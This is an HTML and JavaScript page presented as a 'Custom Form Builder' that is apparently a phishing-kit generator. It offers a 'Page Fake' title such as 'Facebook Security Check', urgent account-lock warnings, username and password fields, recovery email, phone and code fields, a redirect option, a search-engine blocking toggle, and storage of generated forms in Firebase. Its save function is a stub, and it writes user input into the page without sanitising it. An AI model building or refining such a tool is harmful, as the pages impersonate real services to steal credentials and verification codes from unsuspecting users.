  <!DOCTYPE html><html><head>
  <title>Form Builder</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
    .container { max-width: 650px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; }
    input, textarea, button { width: 100%; margin: 10px 0; padding: 10px; border-radius: 5px; border: 1px solid #ccc; }
    label { margin: 10px 0 5px; display: block; font-weight: bold; }
    #fieldsList li { list-style: none; margin-bottom: 5px; background: #f9f9f9; padding: 8px; border: 1px solid #ccc; cursor: move; }
    .preview { border: 1px solid #ccc; background: #fff; padding: 15px; margin-top: 20px; border-radius: 10px; }
  </style>
</head>
<body><div class="container">
  <h2>🎨 Custom Form Builder</h2><label><input type="checkbox" id="blockSEO"> Block Search Engine Indexing</label> <label>SEO Page Title</label><input id="seoTitle" placeholder="Custom page title"> <label>Meta Description</label><textarea id="metaDesc" placeholder="Enter description to help SEO"></textarea> <label>OpenGraph/Twitter Image</label><input type="file" id="ogImage" accept="image/png, image/jpeg, image/jpg, image/gif">

<label>Avatar / Icon Image URL</label><input id="avatar" placeholder="https://example.com/icon.png">

<label>Page Fake</label> <input id="title" placeholder="e.g. Facebook Security Check"> <label>Page Title Color</label> <input type="color" id="titleColor">

<label>Logo Image URL</label> <input id="logo" placeholder="https://..."> <label>Logo Width (px)</label> <input id="logoWidth" placeholder="e.g. 100"> <label>Logo Height (px)</label> <input id="logoHeight" placeholder="e.g. 100">

<label>Banner Image URL</label> <input id="banner" placeholder="https://..."> <label>Banner Width (px)</label> <input id="bannerWidth" placeholder="e.g. 300"> <label>Banner Height (px)</label> <input id="bannerHeight" placeholder="e.g. 150">

<label>Description</label>

  <textarea id="description" placeholder="e.g. Please verify your account."></textarea><label>Warning Message</label>

  <textarea id="warning" placeholder="e.g. ⚠️ Failure to verify may result in account lock!"></textarea><label>Warning Color</label> <input type="color" id="warningColor">

<label><input type="checkbox" id="addAuth"> Include Username & Password</label> <label>Username Placeholder</label> <input id="usernamePlaceholder" placeholder="Enter username"> <label>Password Placeholder</label> <input id="passwordPlaceholder" placeholder="Enter password">

<label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label> <input id="redirectLink" placeholder="Enter redirect URL">

<label>Extra Fields (one per line)</label>

  <textarea id="extraFields" placeholder="e.g. Recovery Email\nPhone Number"></textarea><label>Custom Colors</label> Text Color: <input type="color" id="textColor"> Background Color: <input type="color" id="bgColor"> Button Color: <input type="color" id="btnColor">

<label>Add Field</label> <input id="newField" placeholder="e.g. Code"> <button onclick="addField()">➕ Add Field</button>

  <ul id="fieldsList"></ul><label>Button Text</label> <input id="buttonText" placeholder="e.g. Continue" value="Continue"> <label>Bottom Text (Footer)</label> <input id="footerText" placeholder="e.g. © 2025 All Rights Reserved">

<button onclick="generateForm()">✅ Generate Form</button>

  <div class="preview">
    <strong>Live Preview</strong>
    <div id="livePreview"></div>
  </div>
</div><script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT.firebaseapp.com",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_PROJECT.appspot.com",
  messagingSenderId: "YOUR_SENDER_ID",
  appId: "YOUR_APP_ID"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let fields = [];

function addField() {
  const value = document.getElementById("newField").value;
  if (value.trim()) {
    fields.push(value);
    document.getElementById("newField").value = "";
    renderFields();
    buildPreview();
  }
}

function renderFields() {
  const ul = document.getElementById("fieldsList");
  ul.innerHTML = "";
  fields.forEach((field, i) => {
    const li = document.createElement("li");
    li.textContent = field;
    li.draggable = true;
    li.ondragstart = e => e.dataTransfer.setData("text", i);
    li.ondragover = e => e.preventDefault();
    li.ondrop = e => {
      const from = +e.dataTransfer.getData("text");
      const to = i;
      [fields[from], fields[to]] = [fields[to], fields[from]];
      renderFields();
      buildPreview();
    };
    ul.appendChild(li);
  });
}

function buildPreview() {
  const title = document.getElementById("title").value;
  const titleColor = document.getElementById("titleColor").value;
  const logo = document.getElementById("logo").value;
  const logoW = document.getElementById("logoWidth").value;
  const logoH = document.getElementById("logoHeight").value;
  const banner = document.getElementById("banner").value;
  const bannerW = document.getElementById("bannerWidth").value;
  const bannerH = document.getElementById("bannerHeight").value;
  const avatar = document.getElementById("avatar").value;
  const desc = document.getElementById("description").value;
  const warn = document.getElementById("warning").value;
  const warningColor = document.getElementById("warningColor").value;
  const extras = document.getElementById("extraFields").value.trim().split("\n");
  const showAuth = document.getElementById("addAuth").checked;
  const usernamePlaceholder = document.getElementById("usernamePlaceholder").value;
  const passwordPlaceholder = document.getElementById("passwordPlaceholder").value;
  const redirect = document.getElementById("useRedirect").checked;
  const redirectLink = document.getElementById("redirectLink").value;
  const textColor = document.getElementById("textColor").value;
  const bgColor = document.getElementById("bgColor").value;
  const btnColor = document.getElementById("btnColor").value;
  const buttonText = document.getElementById("buttonText").value || "Submit";
  const footerText = document.getElementById("footerText").value;

  let html = `<div style="background:${bgColor};color:${textColor};padding:20px;border-radius:10px;">`;
  if (avatar) html += `<img src="${avatar}" style="width:60px;height:60px;border-radius:50%;display:block;margin:auto;margin-bottom:10px;">`;
  if (banner) html += `<img src="${banner}" style="width:${bannerW}px;height:${bannerH}px;border-radius:8px;margin-bottom:10px;">`;
  if (logo) html += `<img src="${logo}" style="width:${logoW}px;height:${logoH}px;display:block;margin:auto;">`;
  if (title) html += `<h2 style="text-align:center;color:${titleColor};">${title}</h2>`;
  if (desc) html += `<p style="text-align:center;">${desc}</p>`;
  if (warn) html += `<p style="color:${warningColor};text-align:center;font-weight:bold;">${warn}</p>`;

  html += `<form>`;
  if (showAuth) {
    html += `<input type="text" placeholder="${usernamePlaceholder}" style="width:100%;"><br>`;
    html += `<input type="password" placeholder="${passwordPlaceholder}" style="width:100%;"><br>`;
  }

  fields.concat(extras).filter(x => x.trim()).forEach(f => {
    html += `<input type="text" placeholder="${f}" style="width:100%;"><br>`;
  });

  html += `<button style="background:${btnColor};color:white;padding:10px;margin-top:10px;">${buttonText}</button>`;
  if (footerText) html += `<p style="text-align:center;margin-top:20px;">${footerText}</p>`;
  if (redirect) html += `<p style="text-align:center;color:gray;font-size:12px;">Redirect to: ${redirectLink}</p>`;
  html += `</form></div>`;

  document.getElementById("livePreview").innerHTML = html;
}

["title", "logo", "logoWidth", "logoHeight", "banner", "bannerWidth", "bannerHeight", "avatar", "description", "warning", "warningColor", "extraFields", "textColor", "bgColor", "btnColor", "addAuth", "buttonText", "titleColor", "usernamePlaceholder", "passwordPlaceholder", "footerText", "redirectLink"]
  .forEach(id => document.getElementById(id).addEventListener("input", buildPreview));

document.getElementById("useRedirect").addEventListener("change", buildPreview);

function generateForm() {
  const formData = { /* ... same as before, updated separately */ };
  addDoc(collection(db, "forms"), formData).then(docRef => {
    const id = docRef.id;
    alert("✅ Form saved!\nLink: /form.html?id=" + id);
    location.href = "/forms.html";
  });
}

buildPreview();
</script></body></html>
